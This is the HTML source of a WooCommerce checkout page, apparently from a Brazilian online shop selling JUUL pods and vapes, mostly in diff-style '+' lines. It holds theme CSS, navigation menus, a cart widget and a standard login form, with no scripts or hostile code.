#searchsubmit,.no-results .searchform #searchsubmit:hover,.no-results .searchform #searchsubmit:focus,.return-to-shop .button,.return-to-shop .button:hover,.return-to-shop .button:focus,.basel-hover-excerpt .btn-add a,.basel-hover-excerpt .btn-add a:hover,.basel-hover-excerpt .btn-add a:focus,.basel-hover-standard .btn-add > a,.basel-hover-standard .btn-add > a:hover,.basel-hover-standard .btn-add > a:focus,.basel-price-table .basel-plan-footer > a,.basel-price-table .basel-plan-footer > a:hover, .basel-price-table .basel-plan-footer > a:focus,.basel-pf-btn button,.basel-pf-btn button:hover,.basel-pf-btn button:focus,.basel-info-box.box-style-border .info-btn-wrapper a,.basel-info-box.box-style-border .info-btn-wrapper a:hover,.basel-info-box.box-style-border .info-btn-wrapper a:focus,.basel-info-box2.box-style-border .info-btn-wrapper a,.basel-info-box2.box-style-border .info-btn-wrapper a:hover,.basel-info-box2.box-style-border .info-btn-wrapper a:focus,.basel-hover-quick .woocommerce-variation-add-to-cart .button,.basel-hover-quick .woocommerce-variation-add-to-cart .button:hover, .basel-hover-quick .woocommerce-variation-add-to-cart .button:focus,.product-list-item .product-list-buttons > a,.product-list-item .product-list-buttons > a:hover,.product-list-item .product-list-buttons > a:focus,.wpb_video_wrapper .button-play,.woocommerce-store-notice__dismiss-link:hover,.woocommerce-store-notice__dismiss-link:focus,.basel-compare-table .compare-loader:after,.basel-sticky-sidebar-opener:not(.sticky-toolbar):hover,.basel-sticky-sidebar-opener:not(.sticky-toolbar):focus,.basel-dark .read-more-section .btn-read-more,.basel-dark .basel-load-more,.basel-dark .basel-load-more:hover,.basel-dark .basel-load-more:focus,.basel-dark .feedback-form .wpcf7-submit, .basel-dark .mc4wp-form input[type=submit], .basel-dark .single_add_to_cart_button,.basel-dark .basel-compare-col .add_to_cart_button,.basel-dark .basel-compare-col .added_to_cart,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart,.basel-dark .single-product-content .comment-form .form-submit input[type=submit],.basel-dark .basel-registration-page .basel-switch-to-register, .basel-dark .register .button, .basel-dark .login .button, .basel-dark .lost_reset_password .button, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button, .basel-dark .woocommerce .cart-actions .coupon .button,.basel-dark .feedback-form .wpcf7-submit:hover, .basel-dark .mc4wp-form input[type=submit]:hover, .basel-dark .single_add_to_cart_button:hover,.basel-dark .basel-compare-col .add_to_cart_button:hover,.basel-dark .basel-compare-col .added_to_cart:hover,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:hover, .basel-dark .single-product-content .comment-form .form-submit input[type=submit]:hover,.basel-dark .basel-registration-page .basel-switch-to-register:hover, .basel-dark .register .button:hover, .basel-dark .login .button:hover, .basel-dark .lost_reset_password .button:hover, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:hover,.basel-dark .woocommerce .cart-actions .coupon .button:hover,.basel-ext-primarybtn-dark:focus, .basel-dark .feedback-form .wpcf7-submit:focus,.basel-dark .mc4wp-form input[type=submit]:focus, .basel-dark .single_add_to_cart_button:focus,.basel-dark .basel-compare-col .add_to_cart_button:focus,.basel-dark .basel-compare-col .added_to_cart:focus,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:focus,.basel-dark .single-product-content .comment-form .form-submit input[type=submit]:focus,.basel-dark .basel-registration-page .basel-switch-to-register:focus, .basel-dark .register .button:focus, .basel-dark .login .button:focus, .basel-dark .lost_reset_password .button:focus, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:focus,.basel-dark .woocommerce .cart-actions .coupon .button:focus,.cookies-buttons .cookies-accept-btn:hover,.cookies-buttons .cookies-accept-btn:focus,.blockOverlay:after,.widget_shopping_cart li.basel-loading:after,.basel-price-table:hover,.title-shop .nav-shop ul li a:after,.widget_tag_cloud .tagcloud a:hover,.widget_product_tag_cloud .tagcloud a:hover,div.bbp-submit-wrapper button,div.bbp-submit-wrapper button:hover,div.bbp-submit-wrapper button:focus,#bbpress-forums .bbp-search-form #bbp_search_submit,#bbpress-forums .bbp-search-form #bbp_search_submit:hover,#bbpress-forums .bbp-search-form #bbp_search_submit:focus,.basel-hover-link .swap-elements .btn-add a,.basel-hover-link .swap-elements .btn-add a:hover,.basel-hover-link .swap-elements .btn-add a:focus,.basel-hover-link .swap-elements .btn-add a.loading:after,.scrollToTop:hover, .scrollToTop:focus,.basel-sticky-filter-btn:hover, .basel-sticky-filter-btn:focus,blockquote{border-color:#3a9f4f;}.with-animation .info-box-icon svg path,.single-product-content .entry-summary .basel-sizeguide-btn:hover svg{stroke:#3a9f4f;}.button, 
+button, 
+input[type=submit],
+.yith-woocompare-widget a.button.compare,
+.basel-dark .basel-registration-page .basel-switch-to-register,
+.basel-dark .login .button,
+.basel-dark .register .button,
+.basel-dark .widget_shopping_cart .buttons a,
+.basel-dark .yith-woocompare-widget a.button.compare,
+.basel-dark .widget_price_filter .price_slider_amount .button,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit,
+.basel-dark .basel-widget-layered-nav-dropdown__submit,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]{background-color:#ECECEC;}.button, 
+button, 
+input[type=submit],
+.yith-woocompare-widget a.button.compare,
+.basel-dark .basel-registration-page .basel-switch-to-register,
+.basel-dark .login .button,
+.basel-dark .register .button,
+.basel-dark .widget_shopping_cart .buttons a,
+.basel-dark .yith-woocompare-widget a.button.compare,
+.basel-dark .widget_price_filter .price_slider_amount .button,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit,
+.basel-dark .basel-widget-layered-nav-dropdown__submit,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]{border-color:#ECECEC;}.button:hover,.button:focus, 
+button:hover, 
+button:focus, 
+input[type=submit]:hover, 
+input[type=submit]:focus,
+.yith-woocompare-widget a.button.compare:hover,
+.yith-woocompare-widget a.button.compare:focus,
+.basel-dark .basel-registration-page .basel-switch-to-register:hover,
+.basel-dark .basel-registration-page .basel-switch-to-register:focus,
+.basel-dark .login .button:hover,
+.basel-dark .login .button:focus,
+.basel-dark .register .button:hover,
+.basel-dark .register .button:focus,
+.basel-dark .widget_shopping_cart .buttons a:hover,
+.basel-dark .widget_shopping_cart .buttons a:focus,
+.basel-dark .yith-woocompare-widget a.button.compare:hover,
+.basel-dark .yith-woocompare-widget a.button.compare:focus,
+.basel-dark .widget_price_filter .price_slider_amount .button:hover,
+.basel-dark .widget_price_filter .price_slider_amount .button:focus,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit:hover,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit:focus,
+.basel-dark .basel-widget-layered-nav-dropdown__submit:hover,
+.basel-dark .basel-widget-layered-nav-dropdown__submit:focus,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]:hover,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]:focus{background-color:#000000;}.button:hover,.button:focus, 
+button:hover, 
+button:focus, 
+input[type=submit]:hover, 
+input[type=submit]:focus,
+.yith-woocompare-widget a.button.compare:hover,
+.yith-woocompare-widget a.button.compare:focus,
+.basel-dark .basel-registration-page .basel-switch-to-register:hover,
+.basel-dark .basel-registration-page .basel-switch-to-register:focus,
+.basel-dark .login .button:hover,
+.basel-dark .login .button:focus,
+.basel-dark .register .button:hover,
+.basel-dark .register .button:focus,
+.basel-dark .widget_shopping_cart .buttons a:hover,
+.basel-dark .widget_shopping_cart .buttons a:focus,
+.basel-dark .yith-woocompare-widget a.button.compare:hover,
+.basel-dark .yith-woocompare-widget a.button.compare:focus,
+.basel-dark .widget_price_filter .price_slider_amount .button:hover,
+.basel-dark .widget_price_filter .price_slider_amount .button:focus,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit:hover,
+.basel-dark .woocommerce-widget-layered-nav-dropdown__submit:focus,
+.basel-dark .basel-widget-layered-nav-dropdown__submit:hover,
+.basel-dark .basel-widget-layered-nav-dropdown__submit:focus,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]:hover,
+.basel-dark .woocommerce .cart-actions input[name="update_cart"]:focus{border-color:#000000;}.basel-hover-alt .btn-add>a{color:#3a9f4f;}.single_add_to_cart_button,
+.basel-sticky-btn .basel-sticky-add-to-cart,
+.woocommerce .cart-actions .coupon .button,
+.added_to_cart.btn-color-black, 
+input[type=submit].btn-color-black,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button,
+.basel-hover-quick .quick-shop-btn > a,
+table.compare-list tr.add-to-cart td a,
+.basel-compare-col .add_to_cart_button, 
+.basel-compare-col .added_to_cart{background-color:#3a9f4f;}.single_add_to_cart_button,
+.basel-sticky-btn .basel-sticky-add-to-cart,
+.woocommerce .cart-actions .coupon .button,
+.added_to_cart.btn-color-black, 
+input[type=submit].btn-color-black,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button,
+.basel-hover-quick .quick-shop-btn > a,
+table.compare-list tr.add-to-cart td a,
+.basel-compare-col .add_to_cart_button, 
+.basel-compare-col .added_to_cart{border-color:#3a9f4f;}.basel-hover-alt .btn-add>a:hover,.basel-hover-alt .btn-add>a:focus{color:#3a9f4f;}.single_add_to_cart_button:hover,.single_add_to_cart_button:focus,
+.basel-sticky-btn .basel-sticky-add-to-cart:hover,
+.basel-sticky-btn .basel-sticky-add-to-cart:focus,
+.woocommerce .cart-actions .coupon .button:hover,
+.woocommerce .cart-actions .coupon .button:focus,
+.added_to_cart.btn-color-black:hover,
+.added_to_cart.btn-color-black:focus, 
+input[type=submit].btn-color-black:hover, 
+input[type=submit].btn-color-black:focus,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button:hover,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button:focus,
+.basel-hover-quick .quick-shop-btn > a:hover,
+.basel-hover-quick .quick-shop-btn > a:focus,
+table.compare-list tr.add-to-cart td a:hover,
+table.compare-list tr.add-to-cart td a:focus,
+.basel-compare-col .add_to_cart_button:hover,
+.basel-compare-col .add_to_cart_button:focus, 
+.basel-compare-col .added_to_cart:hover, 
+.basel-compare-col .added_to_cart:focus{background-color:#3a9f4f;}.single_add_to_cart_button:hover,.single_add_to_cart_button:focus,
+.basel-sticky-btn .basel-sticky-add-to-cart:hover,
+.basel-sticky-btn .basel-sticky-add-to-cart:focus,
+.woocommerce .cart-actions .coupon .button:hover,
+.woocommerce .cart-actions .coupon .button:focus,
+.added_to_cart.btn-color-black:hover,
+.added_to_cart.btn-color-black:focus, 
+input[type=submit].btn-color-black:hover, 
+input[type=submit].btn-color-black:focus,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button:hover,
+.wishlist_table tr td.product-add-to-cart>.add_to_cart.button:focus,
+.basel-hover-quick .quick-shop-btn > a:hover,
+.basel-hover-quick .quick-shop-btn > a:focus,
+table.compare-list tr.add-to-cart td a:hover,
+table.compare-list tr.add-to-cart td a:focus,
+.basel-compare-col .add_to_cart_button:hover,
+.basel-compare-col .add_to_cart_button:focus, 
+.basel-compare-col .added_to_cart:hover, 
+.basel-compare-col .added_to_cart:focus{border-color:#3a9f4f;}@font-face {
+			font-weight: normal;
+			font-style: normal;
+			font-family: "simple-line-icons";
+			src: url("//brpods.com/wp-content/themes/basel/fonts/Simple-Line-Icons.woff?v=555.4.0") format("woff"),
+			url("//brpods.com/wp-content/themes/basel/fonts/Simple-Line-Icons.woff2?v=555.4.0") format("woff2");}@font-face {
+			font-weight: normal;
+			font-style: normal;
+			font-family: "basel-font";
+			src: url("//brpods.com/wp-content/themes/basel/fonts/basel-font.woff?v=555.4.0") format("woff"),
+			url("//brpods.com/wp-content/themes/basel/fonts/basel-font.woff2?v=555.4.0") format("woff2");}</style><noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript><noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player, [data-lazy-src]{display:none !important;}</style></noscript></head>
+<body data-rsssl="1" class="page-template-default page page-id-10 theme-basel woocommerce-checkout woocommerce-page woocommerce-no-js wrapper-full-width global-cart-design-1 global-search-dropdown global-header-simple mobile-nav-from-right basel-light catalog-mode-off categories-accordion-off global-wishlist-disable basel-top-bar-on basel-ajax-shop-on basel-ajax-search-off enable-sticky-header header-full-width sticky-header-clone offcanvas-sidebar-mobile offcanvas-sidebar-tablet wpb-js-composer js-comp-ver-7.7.2 vc_responsive elementor-default elementor-kit-16052">
+
+ <div class="login-form-side">
+<div class="widget-heading">
+<h3 class="widget-title">Sign in</h3>
+<a href="#" class="widget-close">Fechar</a>
+</div>
+<div class="login-form">
+<form method="post" class="login woocommerce-form woocommerce-form-login " action="https://brpods.com/my-account/">
+<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-username">
+<label for="username">Usuário ou E-mail&nbsp;<span class="required">*</span></label>
+<input type="text" class="woocommerce-Input woocommerce-Input--text input-text" name="username" id="username" autocomplete="username" value />
+</p>
+<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-password">
+<label for="password">Senha&nbsp;<span class="required">*</span></label>
+<input class="woocommerce-Input woocommerce-Input--text input-text" type="password" name="password" id="password" autocomplete="current-password" />
+</p>
+<p class="form-row">
+<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="367afcf1b1" /><input type="hidden" name="_wp_http_referer" value="/checkout/" /> <button type="submit" class="woocommerce-button button woocommerce-form-login__submit" name="login" value="Fazer login">Fazer login</button>
+</p>
+<div class="login-form-footer">
+<a href="https://brpods.com/my-account/lost-password/" class="woocommerce-LostPassword lost_password">Esqueceu sua senha?</a>
+<label class="woocommerce-form__label woocommerce-form__label-for-checkbox woocommerce-form-login__rememberme">
+<input class="woocommerce-form__input woocommerce-form__input-checkbox" name="rememberme" type="checkbox" value="forever" /> <span>Lembrar-me</span>
+</label>
+</div>
+</form>
+</div>
+<div class="register-question">
+<span class="create-account-text">No account yet?</span>
+<a class="btn btn-style-link" href="https://brpods.com/my-account/?action=register">Create an Account</a>
+</div>
+</div>
+<div class="mobile-nav">
+<form role="search" method="get" id="searchform" class="searchform " action="https://brpods.com/">
+<div>
+<label class="screen-reader-text">Search for:</label>
+<input type="text" class="search-field" placeholder="O QUE VOCÊ PROCURA?" value name="s" id="s" />
+<input type="hidden" name="post_type" id="post_type" value="product">
+<button type="submit" id="searchsubmit" value="BUSCAR">BUSCAR</button>
+</div>
+</form>
+<div class="search-results-wrapper"><div class="basel-scroll"><div class="basel-search-results basel-scroll-content"></div></div></div>
+<div class="menu-main-navigation-2-teste-container"><ul id="menu-main-navigation-2-teste" class="site-mobile-menu"><li id="menu-item-18729" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18729 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-device-slate/">Comece por aqui!</a></li>
+<li id="menu-item-18737" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18737 menu-item-design-default item-event-hover"><a href="#">JUUL</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li id="menu-item-18738" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18738 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/juul-pods/">JUUL PODS</a></li>
+<li id="menu-item-18739" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18739 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/combo-pods/">COMBO PODS</a></li>
+<li id="menu-item-18730" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18730 menu-item-design-default item-event-hover"><a href="#">FAVORITOS</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li id="menu-item-18731" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18731 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-mint/">JUUL Pods Mint</a></li>
+<li id="menu-item-18732" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18732 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-menthol/">JUUL Pods Menthol</a></li>
+<li id="menu-item-18733" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18733 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-virginia-tobacco/">JUUL Pods Virginia</a></li>
+<li id="menu-item-18734" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18734 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-mango/">JUUL Pods Mango</a></li>
+<li id="menu-item-18740" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18740 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/acessorios/">ACESSÓRIOS</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</li>
+<li id="menu-item-18741" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18741 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/descartaveis-ignite-masking-blvk/">DESCARTÁVEIS</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li id="menu-item-19144" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19144 menu-item-design-default item-event-hover menu-item-has-children"><a href="https://brpods.com/loja/descartaveis-ignite-masking-blvk/">Todas as Marcas</a></li>
+<li id="menu-item-18742" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18742 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v8/">IGNITE V8</a></li>
+<li id="menu-item-18735" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18735 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v15/">IGNITE V15</a></li>
+<li id="menu-item-18736" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18736 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v25/">IGNITE V25</a></li>
+<li id="menu-item-18743" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18743 menu-item-design-default item-event-hover"><a href="#">STIG</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li id="menu-item-18744" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18744 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/stig/">STIG PODS</a></li>
+<li id="menu-item-18745" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18745 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/combo-stig/">COMBO STIG</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</li>
+<li id="menu-item-19754" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-has-children menu-item-19754 menu-item-design-default item-event-hover menu-item-has-children"><a href="https://brpods.com/loja/vapes/">Vapes</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li id="menu-item-20230" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-20230 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/vapes-acessorios-cartuchos-resistencias/">ACESSÓRIOS</a></li>
+<li id="menu-item-19755" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-has-children menu-item-19755 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/">Liquidos</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li id="menu-item-19756" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19756 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/freebase/">Freebase</a></li>
+<li id="menu-item-19757" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19757 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/nic-salt/">Nic Salt</a></li>
+</ul>
+</li>
+<li id="menu-item-19758" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19758 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/vape-vaporizadores-pod-mod-systems/">Pod &amp; Mod Systems</a></li>
+</ul>
+</div>
+</div>
+</li>
+<li id="menu-item-18746" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18746 menu-item-design-default item-event-hover"><a href="https://brpods.com/blog/">BLOG</a></li>
+<li id="menu-item-18747" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18747 menu-item-design-default item-event-hover"><a href="https://brpods.com/my-account/">MINHA CONTA</a></li>
+</ul></div> <div class="header-links my-account-with-username my-account-with-icon">
+<ul>
+<li class="login-side-opener"><a href="https://brpods.com/my-account/">Login / Register</a></li>
+</ul>
+</div>
+</div>
+<div class="cart-widget-side">
+<div class="widget-heading">
+<h3 class="widget-title">Carrinho</h3>
+<a href="#" class="widget-close">Fechar</a>
+</div>
+</div>
+<div class="website-wrapper">
+<div class="topbar-wrapp color-scheme-light">
+<div class="container">
+<div class="topbar-content">
+<div class="top-bar-left">
+OFERTAS EXCLUSIVAS PARA CLIENTES VIP
+</div>
+<div class="top-bar-right">
+<div class="topbar-menu">
+</div>
+</div>
+</div>
+</div>
+</div> 
+
+<header class="main-header header-has-no-bg header-simple icons-design-line color-scheme-dark">
+<div class="container">
+<div class="wrapp-header">
+<div class="site-logo">
+<div class="basel-logo-wrap switch-logo-enable">
+<a href="https://brpods.com/" class="basel-logo basel-main-logo" rel="home">
+<img src="https://brpods.com/wp-content/uploads/2019/12/BRPods-logo.png" alt="BRPODS" /> </a>
+<a href="https://brpods.com/" class="basel-logo basel-sticky-logo" rel="home">
+<img src="https://brpods.com/wp-content/uploads/2019/12/BRPods-logo.png" alt="BRPODS" /> </a>
+</div>
+</div>
+<div class="main-nav site-navigation basel-navigation menu-left" role="navigation">
+<div class="menu-main-navigation-2-teste-container"><ul id="menu-main-navigation-2-teste-1" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18729 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-device-slate/">Comece por aqui!</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18737 menu-item-design-default item-event-hover"><a href="#">JUUL</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18738 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/juul-pods/">JUUL PODS</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18739 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/combo-pods/">COMBO PODS</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18730 menu-item-design-default item-event-hover"><a href="#">FAVORITOS</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18731 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-mint/">JUUL Pods Mint</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18732 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-menthol/">JUUL Pods Menthol</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18733 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-virginia-tobacco/">JUUL Pods Virginia</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18734 menu-item-design-default item-event-hover"><a href="https://brpods.com/produto/juul-pods-mango/">JUUL Pods Mango</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18740 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/acessorios/">ACESSÓRIOS</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18741 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/descartaveis-ignite-masking-blvk/">DESCARTÁVEIS</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19144 menu-item-design-default item-event-hover menu-item-has-children"><a href="https://brpods.com/loja/descartaveis-ignite-masking-blvk/">Todas as Marcas</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18742 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v8/">IGNITE V8</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18735 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v15/">IGNITE V15</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18736 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/ignite-v25/">IGNITE V25</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-18743 menu-item-design-default item-event-hover"><a href="#">STIG</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18744 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/stig/">STIG PODS</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-18745 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/combo-stig/">COMBO STIG</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-has-children menu-item-19754 menu-item-design-default item-event-hover menu-item-has-children"><a href="https://brpods.com/loja/vapes/">Vapes</a>
+<div class="sub-menu-dropdown color-scheme-dark">
+<div class="container">
+<ul class="sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-20230 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/vapes-acessorios-cartuchos-resistencias/">ACESSÓRIOS</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-has-children menu-item-19755 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/">Liquidos</a>
+<ul class="sub-sub-menu color-scheme-dark">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19756 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/freebase/">Freebase</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19757 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/liquidos/nic-salt/">Nic Salt</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-19758 menu-item-design-default item-event-hover"><a href="https://brpods.com/loja/vapes/vape-vaporizadores-pod-mod-systems/">Pod &amp; Mod Systems</a></li>
+</ul>
+</div>
+</div>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18746 menu-item-design-default item-event-hover"><a href="https://brpods.com/blog/">BLOG</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18747 menu-item-design-default item-event-hover"><a href="https://brpods.com/my-account/">MINHA CONTA</a></li>
+</ul></div> </div>
+<div class="right-column">
+<div class="search-button basel-search-dropdown mobile-search-icon">
+<a href="#">
+<i class="fa fa-search"></i>
+</a>
+<div class="basel-search-wrapper">
+<div class="basel-search-inner">
+<span class="basel-close-search">Fechar</span>
+<form role="search" method="get" id="searchform" class="searchform " action="https://brpods.com/">
+<div>
+<label class="screen-reader-text">Search for:</label>
+<input type="text" class="search-field" placeholder="O QUE VOCÊ PROCURA?" value name="s" id="s" />
+<input type="hidden" name="post_type" id="post_type" value="product">
+<button type="submit" id="searchsubmit" value="BUSCAR">BUSCAR</button>
+</div>
+</form>
+<div class="search-results-wrapper"><div class="basel-scroll"><div class="basel-search-results basel-scroll-content"></div></div></div>
+</div>
+</div>
+</div>
+<div class="shopping-cart basel-cart-design-1 basel-cart-icon cart-widget-opener">
+<a href="https://brpods.com/cart/">
+<span>Cart (<span>o</span>)</span>
+<span class="basel-cart-totals">
+<span class="basel-cart-number">2</span>
+<span class="subtotal-divider">/</span>
+<span class="basel-cart-subtotal"><span class="woocommerce-Price-amount amount"><bdi><span class="woocommerce-Price-currencySymbol">&#82;&#36;</span>170,00</bdi></span></span>
+</span>
+</a>
+</div>
+<div class="mobile-nav-icon">
+<span class="basel-burger"></span>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="clear"></div>
+<div class="main-page-wrapper">
+<div class="page-title page-title-default title-size-small title-design-centered color-scheme-light" style>
+<div class="container">
+<header class="entry-header">
+<h1 class="entry-title">Checkout</h1> </header>
+</div>
+</div>
+
+<div class="container">
+<div class="row">
+<div class="site-content col-sm-12" role="main">
+<article id="post-10" class="post-10 page type-page status-publish hentry">
+<div class="entry-content">
+<div class="wpb-content-wrapper"><div class="vc_row wpb_row vc_row-fluid"><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner"><div class="wpb_wrapper">
+<div class="wpb_text_column wpb_content_element">
+<div class="wpb_wrapper">
+</div>
+</div>
+</div></div></div></div><div class="woocommerce"><div class="woocommerce-notices-wrapper"></div><div class="woocommerce-form-login-toggle">
+<div class="woocommerce-info">
+Já é cliente? <a href="#" class="showlogin">Clique aqui para entrar</a> </div>
+</div>
+<form method="post" class="login woocommerce-form woocommerce-form-login hidden-form" style="display:none;">
+<p>Caso você já tenha comprado com a gente antes, digite seus dados abaixo. Caso você seja um novo cliente, vá para a seção de &quot;faturamento&quot;.</p>
+<p class="woocommerce-FormRow woocommerce-FormRow--wide form-row form-row-wide form-row-username">
+<label for="username">Usuário ou E-mail&nbsp;<span class="required">*</span></label>
+<input type="text" class="woocommerce-Input woocommerce-Input--text input-text" name="username" id="username" autocomplete="username" value />
+</p>
